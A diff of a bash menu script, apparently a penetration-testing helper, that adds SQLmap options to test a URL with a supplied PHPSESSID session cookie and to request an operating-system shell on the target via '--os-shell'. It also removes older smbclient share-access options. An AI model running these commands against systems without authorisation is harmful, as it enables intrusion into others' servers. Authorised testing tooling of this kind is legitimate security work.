@@ -1,10 +1,6 @@
 #!/bin/bash
 #Thanks you for using Touches Helper. This is an open-source project for Ethical Hacker looking to automate some of the most known tool. Feel free to edit this project as you see fit.
 
-#Adding to the main menu: see examples below. First without text color, second with text color.
-	#printf "3. SMB\n" 
-	#printf "4. ${LIGHTRED}Exit\n${SET}"
-
 
 
 #colors
@@ -172,33 +168,40 @@ done
 sqlmap ()  { while true; do  
     printf "\n${GREEN}\nSQLmap Menu........\n\n${SET}"
     printf "1. Detect SQL injection flaws\n"
-    printf "2. \n"
-    printf "3. \n"
+    printf "2. Check For Cookie Vulnerabilities\n"
+    printf "3. Get Cookie Shell\n"
     printf "4. ${CYAN}Back\n${SET}"
     printf "5. ${LIGHTRED}Exit\n${SET}"
     printf "*****************\n"
     read -p "How can MINION help? :  " choice
 
        case $choice in
-        1) printf "${CYAN}\n\nDetect SQL injection flaws selected${SET}\n"
+        1) printf "${CYAN}\n\nDetect SQL injection flaws Selected${SET}\n"
            read -p "Enter url: " url
            printf "${GREEN}\n\nMINION process request.....\n${SET}"
            cd /usr/share/sqlmap
            ./sqlmap.py -u $url
         
            ;;
-        2) printf "${CYAN}\nTest for Uncredentialed Access selected\n${SET}"
-           read -p "Share Name : " share
-           printf "${GREEN}\nMINION Attempting to gain access now..........\n${SET}"
-           printf "${CYAN}Hit 'enter' or input a password when prompted\n"${SET}
-           smbclient \\\\$IP\\$share
+           
+        2) printf "${CYAN}\n\nCheck For Cookie Vulnerabilities Selected${SET}\n"
+           read -p "Enter url: " url
+           read -p "Enter PHPSESSID: "  cookie 
+           printf "${GREEN}\n\nMINION process request.....\n${SET}"
+           cd /usr/share/sqlmap
+           ./sqlmap.py -u $url --cookie="PHPSESSID=$cookie"
+           
            ;;
-        3) printf "${CYAN}\nAccess with Credentials selected\n${SET}"
-           read -p "Share Name : " share
-           read -p "Username : " uname
-           printf "${GREEN}\nMINION Attempting to gain access now......\n${SET}"
-           smbclient \\\\$IP\\$share -U $uname
+           
+        3) printf "${CYAN}\n\nGet Cookie Shell Selected${SET}\n"
+           read -p "Enter url: " url
+           read -p "Enter PHPSESSID: "  cookie 
+           printf "${GREEN}\n\nMINION process request.....\n${SET}"
+           cd /usr/share/sqlmap
+           ./sqlmap.py -u $url --cookie="PHPSESSID=$cookie" --os-shell
+           
            ;;
+           
         4) main_menu;;
         
         5) exit;;
